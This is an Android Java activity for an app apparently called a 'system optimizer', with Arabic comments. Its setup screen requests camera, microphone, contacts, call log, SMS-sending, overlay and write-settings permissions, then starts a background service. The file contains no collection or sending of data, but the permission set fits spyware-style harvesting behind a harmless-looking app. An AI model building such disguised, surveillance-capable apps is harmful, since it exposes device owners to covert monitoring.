package com.example.systemoptimizer;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.ComponentActivity;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/**
 * مركز الصلاحيات: شاشة الإعداد الأولي الوحيدة.
 *
 * تعرض صلاحيات التشغيل (الكاميرا، الميكروفون، الإشعارات، جهات الاتصال، سجل
 * المكالمات، الرسائل) بجانب الصلاحيات الخاصة (العرض فوق التطبيقات وتعديل
 * إعدادات النظام). لا يستخدم أي صلاحيات root في هذه الشاشة: كل طلب يتم عبر
 * واجهات النظام العادية.
 */
public class PermissionCenterActivity extends ComponentActivity {

    public static final String[] RUNTIME_PERMISSIONS;

    static {
        List<String> base = new ArrayList<>();
        base.add(Manifest.permission.CAMERA);
        base.add(Manifest.permission.RECORD_AUDIO);
        base.add(Manifest.permission.READ_CONTACTS);
        base.add(Manifest.permission.READ_CALL_LOG);
        base.add(Manifest.permission.SEND_SMS);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            base.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        RUNTIME_PERMISSIONS = base.toArray(new String[0]);
    }

    private final ActivityResultLauncher<String[]> runtimeLauncher =
            registerForActivityResult(
                    new ActivityResultContracts.RequestMultiplePermissions(),
                    ignored -> refresh());

    private TextView statusView;
    private Button runtimeButton;
    private Button startButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission_center);

        statusView = findViewById(R.id.pc_status);
        runtimeButton = findViewById(R.id.pc_btn_runtime);
        Button overlayButton = findViewById(R.id.pc_btn_overlay);
        Button writeSettingsButton = findViewById(R.id.pc_btn_write_settings);
        Button diagnosticsButton = findViewById(R.id.pc_btn_diagnostics);
        startButton = findViewById(R.id.pc_btn_start);

        runtimeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] missing = allMissingRuntimePermissions();
                if (missing.length > 0) {
                    runtimeLauncher.launch(missing);
                } else {
                    refresh();
                }
            }
        });

        overlayButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });

        writeSettingsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });

        diagnosticsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(PermissionCenterActivity.this,
                        ManagementDiagnosticsActivity.class));
            }
        });

        startButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startServiceAndFinish();
            }
        });

        refresh();
    }

    @Override
    protected void onResume() {
        super.onResume();
        refresh();
    }

    private String[] allMissingRuntimePermissions() {
        List<String> missing = new ArrayList<>();
        for (String perm : RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missing.add(perm);
            }
        }
        return missing.toArray(new String[0]);
    }

    private boolean allRuntimeGranted() {
        return allMissingRuntimePermissions().length == 0;
    }

    private boolean overlayGranted() {
        return Settings.canDrawOverlays(this);
    }

    private boolean writeSettingsGranted() {
        return Settings.System.canWrite(this);
    }

    private void refresh() {
        StringBuilder sb = new StringBuilder();
        for (String perm : RUNTIME_PERMISSIONS) {
            boolean granted = ContextCompat.checkSelfPermission(this, perm)
                    == PackageManager.PERMISSION_GRANTED;
            sb.append(granted ? "✓ " : "✗ ").append(prettyName(perm)).append("\n");
        }
        sb.append(overlayGranted() ? "✓ " : "✗ ")
                .append("العرض فوق التطبيقات (SYSTEM_ALERT_WINDOW)\n");
        sb.append(writeSettingsGranted() ? "✓ " : "✗ ")
                .append("تعديل إعدادات النظام (WRITE_SETTINGS)\n");
        statusView.setText(sb.toString());

        boolean ready = allRuntimeGranted();
        startButton.setEnabled(ready);
        runtimeButton.setText(ready
                ? "كل الصلاحيات المطلوبة ممنوحة"
                : "منح الصلاحيات المطلوبة");
    }

    private static String prettyName(String perm) {
        switch (perm) {
            case Manifest.permission.CAMERA:
                return "الكاميرا (Camera)";
            case Manifest.permission.RECORD_AUDIO:
                return "الميكروفون (Microphone)";
            case Manifest.permission.READ_CONTACTS:
                return "جهات الاتصال (Contacts)";
            case Manifest.permission.READ_CALL_LOG:
                return "سجل المكالمات (Call Log)";
            case Manifest.permission.SEND_SMS:
                return "إرسال الرسائل (SMS)";
            case Manifest.permission.POST_NOTIFICATIONS:
                return "الإشعارات (Notifications)";
            default:
                return perm;
        }
    }

    /**
     * اكتمال الإعداد: جميع صلاحيات التشغيل المطلوبة ممنوحة.
     * الصلاحيات الخاصة (العرض فوق التطبيقات / تعديل الإعدادات) موصى بها
     * لكنها ليست شرطاً للتشغيل.
     */
    public static boolean setupComplete(Context context) {
        for (String perm : RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void startServiceAndFinish() {
        ContextCompat.startForegroundService(this,
                new Intent(this, BackgroundService.class));
        finish();
    }
}